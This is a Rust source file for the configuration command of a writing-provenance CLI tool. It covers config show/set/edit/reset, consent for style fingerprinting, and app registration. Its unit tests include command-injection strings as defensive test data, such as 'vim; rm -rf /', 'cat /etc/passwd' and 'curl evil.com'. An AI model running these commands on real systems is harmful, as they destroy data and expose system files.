// SPDX-License-Identifier: AGPL-3.0-only OR LicenseRef-Commercial

use anyhow::{anyhow, bail, Context, Result};
use cpoe::config::CpopConfig;
use std::fs;
use std::io::{self, BufRead, Write};

use crate::cli::ConfigAction;
use crate::util::writersproof_dir;

/// Parse a boolean from user input, accepting true/false, 1/0, yes/no (case-insensitive).
fn parse_bool_lenient(s: &str) -> std::result::Result<bool, String> {
    match s.to_lowercase().as_str() {
        "true" | "1" | "yes" => Ok(true),
        "false" | "0" | "no" => Ok(false),
        _ => Err(format!(
            "Invalid boolean value: '{}'. Use true/false, yes/no, or 1/0.",
            s
        )),
    }
}

pub(crate) fn cmd_config(action: ConfigAction) -> Result<()> {
    let dir = writersproof_dir()?;
    let config_path = dir.join("writersproof.json");

    match action {
        ConfigAction::Show => {
            let config = CpopConfig::load_or_default(&dir)?;

            println!("=== CPoE Configuration ===");
            println!();
            println!("Data directory: {}", config.data_dir.display());
            println!();
            println!("[VDF]");
            println!(
                "  iterations_per_second: {}",
                config.vdf.iterations_per_second
            );
            println!("  min_iterations: {}", config.vdf.min_iterations);
            println!("  max_iterations: {}", config.vdf.max_iterations);
            println!();
            println!("[Sentinel]");
            println!("  auto_start: {}", config.sentinel.auto_start);
            println!(
                "  heartbeat_interval_secs: {}",
                config.sentinel.heartbeat_interval_secs
            );
            println!(
                "  checkpoint_interval_secs: {}",
                config.sentinel.checkpoint_interval_secs
            );
            println!("  idle_timeout_secs: {}", config.sentinel.idle_timeout_secs);
            println!(
                "  default_witnessing_mode: {}",
                config.sentinel.default_witnessing_mode.as_str()
            );
            println!(
                "  default_content_granularity: {}",
                config.sentinel.default_content_granularity.as_str()
            );
            println!();
            println!("[Fingerprint]");
            println!(
                "  activity_enabled: {}",
                config.fingerprint.activity_enabled
            );
            println!("  style_enabled: {}", config.fingerprint.style_enabled);
            println!("  retention_days: {}", config.fingerprint.retention_days);
            println!("  min_samples: {}", config.fingerprint.min_samples);
            println!();
            println!("[Privacy]");
            println!(
                "  detect_sensitive_fields: {}",
                config.privacy.detect_sensitive_fields
            );
            println!("  hash_urls: {}", config.privacy.hash_urls);
            println!("  obfuscate_titles: {}", config.privacy.obfuscate_titles);
            println!();
            println!("Config file: {}", config_path.display());
        }

        ConfigAction::Set { key, value } => {
            let mut config = CpopConfig::load_or_default(&dir)?;

            let parts: Vec<&str> = key.split('.').collect();

            match parts.as_slice() {
                ["sentinel", "auto_start"] => {
                    config.sentinel.auto_start =
                        parse_bool_lenient(&value).map_err(|e| anyhow!("{}", e))?;
                }
                ["sentinel", "heartbeat_interval_secs"] => {
                    let v: u64 = value
                        .parse()
                        .map_err(|_| anyhow!("Invalid integer value: {}", value))?;
                    if !(1..=3600).contains(&v) {
                        bail!("heartbeat_interval_secs must be between 1 and 3600");
                    }
                    config.sentinel.heartbeat_interval_secs = v;
                }
                ["sentinel", "checkpoint_interval_secs"] => {
                    let v: u64 = value
                        .parse()
                        .map_err(|_| anyhow!("Invalid integer value: {}", value))?;
                    if !(1..=3600).contains(&v) {
                        bail!("checkpoint_interval_secs must be between 1 and 3600");
                    }
                    config.sentinel.checkpoint_interval_secs = v;
                }
                ["sentinel", "idle_timeout_secs"] => {
                    let v: u64 = value
                        .parse()
                        .map_err(|_| anyhow!("Invalid integer value: {}", value))?;
                    if !(1..=86400).contains(&v) {
                        bail!("idle_timeout_secs must be between 1 and 86400");
                    }
                    config.sentinel.idle_timeout_secs = v;
                }
                ["fingerprint", "activity_enabled"] => {
                    config.fingerprint.activity_enabled =
                        parse_bool_lenient(&value).map_err(|e| anyhow!("{}", e))?;
                }
                ["fingerprint", "style_enabled"] => {
                    let enabled: bool = parse_bool_lenient(&value).map_err(|e| anyhow!("{}", e))?;

                    if enabled {
                        // Trigger style consent flow
                        use cpoe::fingerprint::{ConsentManager, ConsentStatus};

                        let mut consent_manager = ConsentManager::new(&config.data_dir)
                            .map_err(|e| anyhow!("consent manager: {}", e))
                            .context("Failed to read consent status. Try: rm ~/.writersproof/consent.json and retry")?;

                        match consent_manager.status() {
                            ConsentStatus::Granted => {
                                config.fingerprint.style_enabled = true;
                            }
                            ConsentStatus::Denied | ConsentStatus::Revoked => {
                                println!("You previously declined style fingerprinting.");
                                println!();
                                if !prompt_style_consent(&mut consent_manager, &mut config)? {
                                    return Ok(());
                                }
                            }
                            ConsentStatus::NotRequested => {
                                if !prompt_style_consent(&mut consent_manager, &mut config)? {
                                    return Ok(());
                                }
                            }
                        }
                    } else {
                        use cpoe::fingerprint::ConsentManager;

                        let mut consent_manager = ConsentManager::new(&config.data_dir)
                            .map_err(|e| anyhow!("consent manager: {}", e))?;
                        consent_manager
                            .revoke_consent()
                            .map_err(|e| anyhow!("revoke consent: {}", e))?;
                        config.fingerprint.style_enabled = false;
                    }
                }
                ["fingerprint", "retention_days"] => {
                    let v: u32 = value
                        .parse()
                        .map_err(|_| anyhow!("Invalid integer value: {}", value))?;
                    if !(1..=36500).contains(&v) {
                        bail!("retention_days must be between 1 and 36500");
                    }
                    config.fingerprint.retention_days = v;
                }
                ["fingerprint", "min_samples"] => {
                    let v: u32 = value
                        .parse()
                        .map_err(|_| anyhow!("Invalid integer value: {}", value))?;
                    if !(1..=100_000).contains(&v) {
                        bail!("min_samples must be between 1 and 100000");
                    }
                    config.fingerprint.min_samples = v;
                }
                ["privacy", "detect_sensitive_fields"] => {
                    config.privacy.detect_sensitive_fields =
                        parse_bool_lenient(&value).map_err(|e| anyhow!("{}", e))?;
                }
                ["privacy", "hash_urls"] => {
                    config.privacy.hash_urls =
                        parse_bool_lenient(&value).map_err(|e| anyhow!("{}", e))?;
                }
                ["privacy", "obfuscate_titles"] => {
                    config.privacy.obfuscate_titles =
                        parse_bool_lenient(&value).map_err(|e| anyhow!("{}", e))?;
                }
                ["sentinel", "default_witnessing_mode"] => {
                    config.sentinel.default_witnessing_mode = value
                        .parse()
                        .map_err(|()| anyhow!(
                            "Invalid witnessing mode: {value}. Valid: auto, file_level, content_level, hybrid"
                        ))?;
                }
                ["sentinel", "default_content_granularity"] => {
                    config.sentinel.default_content_granularity = value
                        .parse()
                        .map_err(|()| anyhow!(
                            "Invalid granularity: {value}. Valid: paragraph, sentence, block"
                        ))?;
                }
                _ => {
                    return Err(anyhow!(
                        "Unknown configuration key: {key}. Run 'cpoe config show' to see valid keys."
                    ));
                }
            }

            config.persist()?;
            // Show the raw value the user provided, so "1" stays "1" instead of "true"
            println!("Set {} = {}", key, value);
        }

        ConfigAction::Edit => {
            let config = CpopConfig::load_or_default(&dir)?;
            config.persist()?;

            let editor = std::env::var("EDITOR").unwrap_or_else(|_| {
                if cfg!(target_os = "windows") {
                    "notepad".to_string()
                } else {
                    "nano".to_string()
                }
            });

            // Strip surrounding quotes (single or double) that some shells leave in $EDITOR
            let editor = editor.trim().to_string();
            let editor = if (editor.starts_with('"') && editor.ends_with('"'))
                || (editor.starts_with('\'') && editor.ends_with('\''))
            {
                editor[1..editor.len() - 1].to_string()
            } else {
                editor
            };

            let (cmd, args) = parse_editor_value(&editor)?;

            // Resolve relative commands to absolute paths to prevent $PATH injection
            let resolved_cmd = if std::path::Path::new(&cmd).is_absolute() {
                if !std::path::Path::new(&cmd).exists() {
                    return Err(anyhow!(
                        "Editor not found: {}\n\n\
                         Set a valid editor with: export EDITOR=vim",
                        cmd
                    ));
                }
                cmd.clone()
            } else {
                #[cfg(windows)]
                let which_bin = "where";
                #[cfg(not(windows))]
                let which_bin = "which";
                let which_output = std::process::Command::new(which_bin)
                    .arg(&cmd)
                    .output()
                    .ok()
                    .and_then(|o| {
                        if o.status.success() {
                            Some(String::from_utf8_lossy(&o.stdout).trim().to_string())
                        } else {
                            None
                        }
                    });
                match which_output {
                    Some(abs_path) => abs_path,
                    None => {
                        return Err(anyhow!(
                            "Editor not found in PATH: {}\n\n\
                             Set a valid editor with: export EDITOR=vim",
                            cmd
                        ));
                    }
                }
            };

            println!("Opening {} in {}...", config_path.display(), &resolved_cmd);

            let status = std::process::Command::new(&resolved_cmd)
                .args(&args)
                .arg(&config_path)
                .status()
                .map_err(|e| anyhow!("open editor '{}': {}", cmd, e))?;

            if status.success() {
                const MAX_EDIT_RETRIES: u32 = 3;
                let mut retries = 0;
                loop {
                    match CpopConfig::load_or_default(&dir) {
                        Ok(_) => {
                            println!("Configuration saved.");
                            break;
                        }
                        Err(e) => {
                            retries += 1;
                            eprintln!("Warning: Configuration is invalid: {}", e);
                            if retries >= MAX_EDIT_RETRIES {
                                eprintln!(
                                    "Configuration still invalid after {} attempts. \
                                     It may be ignored on next run.",
                                    MAX_EDIT_RETRIES
                                );
                                break;
                            }
                            if crate::smart_defaults::ask_confirmation("Reopen in editor?", true)? {
                                let retry = std::process::Command::new(&resolved_cmd)
                                    .args(&args)
                                    .arg(&config_path)
                                    .status()
                                    .map_err(|err| {
                                        anyhow!("reopen editor '{}': {}", resolved_cmd, err)
                                    })?;
                                if !retry.success() {
                                    break;
                                }
                            } else {
                                eprintln!(
                                    "Configuration left as-is. \
                                     It may be ignored on next run."
                                );
                                break;
                            }
                        }
                    }
                }
            }
        }

        ConfigAction::Reset { force } => {
            if !force {
                print!("Reset all configuration to defaults? (yes/no): ");
                io::stdout().flush()?;

                let stdin = io::stdin();
                let mut response = String::new();
                stdin.lock().read_line(&mut response)?;

                if crate::util::parse_yes_no(&response) != Some(true) {
                    println!("Cancelled.");
                    return Ok(());
                }
            }

            if config_path.exists() {
                fs::remove_file(&config_path)?;
            }

            let config = CpopConfig::load_or_default(&dir)?;
            config.persist()?;

            println!("Configuration reset to defaults.");
        }
        ConfigAction::App { action } => cmd_app(action, &dir)?,
    }

    Ok(())
}

fn cmd_app(action: crate::cli::AppAction, data_dir: &std::path::Path) -> Result<()> {
    use cpoe::sentinel::app_registry::{AppRegistry, UserWritingApp};
    use cpoe::sentinel::app_discovery::probe_app;

    match action {
        crate::cli::AppAction::Add { name } => {
            let bundle_id = match name {
                Some(n) => n,
                None => {
                    print!("Bundle ID or app name: ");
                    io::stdout().flush()?;
                    let mut input = String::new();
                    io::stdin().lock().read_line(&mut input)?;
                    input.trim().to_string()
                }
            };
            if bundle_id.is_empty() {
                bail!("No app specified");
            }

            println!("Probing {bundle_id}...");
            let probe = probe_app(&bundle_id);

            let confidence_label = match probe.confidence {
                cpoe::sentinel::app_registry::ProbeConfidence::High => "high",
                cpoe::sentinel::app_registry::ProbeConfidence::Medium => "medium",
                cpoe::sentinel::app_registry::ProbeConfidence::Low => "low",
            };
            println!(
                "  Name:       {}",
                probe.display_name
            );
            println!(
                "  Storage:    {:?}",
                probe.storage
            );
            println!(
                "  Confidence: {confidence_label}",
            );
            if !probe.container_paths.is_empty() {
                println!("  Containers: {}", probe.container_paths.join(", "));
            }

            print!("Add this app? (yes/no): ");
            io::stdout().flush()?;
            let mut response = String::new();
            io::stdin().lock().read_line(&mut response)?;
            if crate::util::parse_yes_no(&response) != Some(true) {
                println!("Cancelled.");
                return Ok(());
            }

            let app = UserWritingApp {
                bundle_id,
                display_name: probe.display_name,
                storage: probe.storage,
                container_paths: probe.container_paths,
                needs_title_inference: probe.needs_title_inference,
                added_at: std::time::SystemTime::now(),
                probe_confidence: probe.confidence,
                last_seen_at: None,
                witnessing_mode: Default::default(),
            };
            let mut registry = AppRegistry::load(data_dir);
            registry.add_user_app(app)?;
            println!("App added.");
        }
        crate::cli::AppAction::List => {
            let registry = AppRegistry::load(data_dir);

            println!("Built-in apps:");
            for app in cpoe::sentinel::app_registry::KNOWN_WRITING_APPS {
                println!("  {} ({})", app.display_name, app.bundle_id);
            }

            let user = registry.user_apps();
            if user.is_empty() {
                println!("\nNo user-added apps.");
            } else {
                println!("\nUser-added apps:");
                for app in user {
                    println!("  {} ({}) [{:?}]", app.display_name, app.bundle_id, app.probe_confidence);
                }
            }
        }
        crate::cli::AppAction::Remove { name } => {
            let mut registry = AppRegistry::load(data_dir);
            let Some(bid) = registry
                .user_apps()
                .iter()
                .find(|a| {
                    a.bundle_id.eq_ignore_ascii_case(&name)
                        || a.display_name.eq_ignore_ascii_case(&name)
                })
                .map(|a| a.bundle_id.clone())
            else {
                bail!("No user-added app matching '{name}'");
            };

            print!("Remove '{bid}'? (yes/no): ");
            io::stdout().flush()?;
            let mut response = String::new();
            io::stdin().lock().read_line(&mut response)?;
            if crate::util::parse_yes_no(&response) != Some(true) {
                println!("Cancelled.");
                return Ok(());
            }

            registry.remove_user_app(&bid)?;
            println!("App removed.");
        }
    }
    Ok(())
}

fn prompt_style_consent(
    consent_manager: &mut cpoe::fingerprint::ConsentManager,
    config: &mut CpopConfig,
) -> Result<bool> {
    println!("=== Style Fingerprinting Consent ===");
    println!();
    println!("{}", cpoe::fingerprint::consent::CONSENT_EXPLANATION);
    println!();

    print!("Do you consent to style fingerprinting? (yes/no): ");
    io::stdout().flush()?;

    let mut response = String::new();
    io::stdin().lock().read_line(&mut response)?;

    if crate::util::parse_yes_no(&response) == Some(true) {
        consent_manager
            .grant_consent()
            .map_err(|e| anyhow!("record consent: {}", e))?;
        config.fingerprint.style_enabled = true;
        config.persist()?;
        println!();
        println!("Style fingerprinting enabled.");
        Ok(true)
    } else {
        consent_manager
            .deny_consent()
            .map_err(|e| anyhow!("record denial: {}", e))?;
        println!();
        println!("Style fingerprinting not enabled.");
        Ok(false)
    }
}

/// Split EDITOR into command + args, handling quoted paths correctly.
///
/// Supports values like `"/Applications/My Editor.app/Contents/MacOS/editor" --wait`.
fn parse_editor_value(editor: &str) -> Result<(String, Vec<String>)> {
    let parts =
        shell_words::split(editor).map_err(|e| anyhow!("Failed to parse EDITOR value: {e}"))?;
    let (cmd, args) = parts
        .split_first()
        .ok_or_else(|| anyhow!("EDITOR environment variable is empty"))?;
    Ok((cmd.clone(), args.to_vec()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_editor_simple_command() {
        let (cmd, args) = parse_editor_value("vim").unwrap();
        assert_eq!(cmd, "vim");
        assert!(args.is_empty());
    }

    #[test]
    fn test_parse_editor_with_args() {
        let (cmd, args) = parse_editor_value("code --wait").unwrap();
        assert_eq!(cmd, "code");
        assert_eq!(args, vec!["--wait"]);
    }

    #[test]
    fn test_parse_editor_with_multiple_args() {
        let (cmd, args) = parse_editor_value("emacs -nw --no-splash").unwrap();
        assert_eq!(cmd, "emacs");
        assert_eq!(args, vec!["-nw", "--no-splash"]);
    }

    #[test]
    fn test_parse_editor_injection_attempt_semicolon() {
        let (cmd, args) = parse_editor_value("vim; rm -rf /").unwrap();
        assert_eq!(cmd, "vim;");
        assert_eq!(args, vec!["rm", "-rf", "/"]);
    }

    #[test]
    fn test_parse_editor_injection_attempt_pipe() {
        let (cmd, args) = parse_editor_value("vim | cat /etc/passwd").unwrap();
        assert_eq!(cmd, "vim");
        assert_eq!(args, vec!["|", "cat", "/etc/passwd"]);
    }

    #[test]
    fn test_parse_editor_injection_attempt_and() {
        let (cmd, args) = parse_editor_value("vim && curl evil.com").unwrap();
        assert_eq!(cmd, "vim");
        assert_eq!(args, vec!["&&", "curl", "evil.com"]);
    }

    #[test]
    fn test_parse_editor_injection_attempt_backtick() {
        let (cmd, args) = parse_editor_value("vim `whoami`").unwrap();
        assert_eq!(cmd, "vim");
        assert_eq!(args, vec!["`whoami`"]);
    }

    #[test]
    fn test_parse_editor_empty_string() {
        let result = parse_editor_value("");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_editor_whitespace_only() {
        let result = parse_editor_value("   ");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_editor_extra_whitespace() {
        let (cmd, args) = parse_editor_value("  vim   --clean  ").unwrap();
        assert_eq!(cmd, "vim");
        assert_eq!(args, vec!["--clean"]);
    }

    // --- parse_bool_lenient ---

    #[test]
    fn test_parse_bool_true_variants() {
        assert_eq!(parse_bool_lenient("true"), Ok(true));
        assert_eq!(parse_bool_lenient("1"), Ok(true));
        assert_eq!(parse_bool_lenient("yes"), Ok(true));
    }

    #[test]
    fn test_parse_bool_false_variants() {
        assert_eq!(parse_bool_lenient("false"), Ok(false));
        assert_eq!(parse_bool_lenient("0"), Ok(false));
        assert_eq!(parse_bool_lenient("no"), Ok(false));
    }

    #[test]
    fn test_parse_bool_case_insensitive() {
        assert_eq!(parse_bool_lenient("TRUE"), Ok(true));
        assert_eq!(parse_bool_lenient("False"), Ok(false));
        assert_eq!(parse_bool_lenient("YES"), Ok(true));
        assert_eq!(parse_bool_lenient("No"), Ok(false));
    }

    #[test]
    fn test_parse_bool_invalid_values() {
        assert!(
            parse_bool_lenient("maybe").is_err(),
            "'maybe' should be invalid"
        );
        assert!(
            parse_bool_lenient("").is_err(),
            "empty string should be invalid"
        );
        assert!(parse_bool_lenient("2").is_err(), "'2' should be invalid");
        assert!(
            parse_bool_lenient("y").is_err(),
            "'y' alone should be invalid"
        );
        assert!(
            parse_bool_lenient("n").is_err(),
            "'n' alone should be invalid"
        );
    }

    #[test]
    fn test_parse_bool_invalid_error_contains_value() {
        let err = parse_bool_lenient("banana").unwrap_err();
        assert!(
            err.contains("banana"),
            "error message should include the invalid value, got: {err}"
        );
    }

    #[test]
    fn test_parse_bool_whitespace_not_trimmed() {
        // Current implementation calls .to_lowercase() but not .trim()
        // This documents the actual behavior
        assert!(
            parse_bool_lenient(" true").is_err(),
            "leading whitespace should cause parse failure (not trimmed)"
        );
        assert!(
            parse_bool_lenient("true ").is_err(),
            "trailing whitespace should cause parse failure (not trimmed)"
        );
    }
}
